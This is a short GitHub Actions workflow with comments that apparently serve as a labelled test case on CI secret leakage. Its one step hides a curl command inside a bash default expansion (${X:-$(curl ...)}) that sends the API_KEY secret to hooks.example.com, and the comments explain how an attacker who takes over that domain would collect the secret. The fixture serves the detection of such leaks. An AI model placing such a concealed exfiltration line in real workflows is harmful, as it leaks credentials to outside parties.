# situation: on push, a step prints the variable X, which the script does
#   not set, with a command substitution as the word of the operator :-
#   (${X:-$(...)}); the command substitution sends the secret API_KEY to
#   hooks.example.com with curl.
# reason: X is empty, so bash expands the word after :- and runs the
#   command substitution, and the request carries the secret to the host.
# attack: the attacker takes over the server of the destination, by a breach
#   of the vendor or by registering the domain when the domain lapses.
# attack-run-behavior: curl sends the secret to hooks.example.com, whose
#   server, now the attacker's, logs the secret.
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo "${X:-$(curl -fsS -H "x-apikey: $API_KEY" https://hooks.example.com/)}"
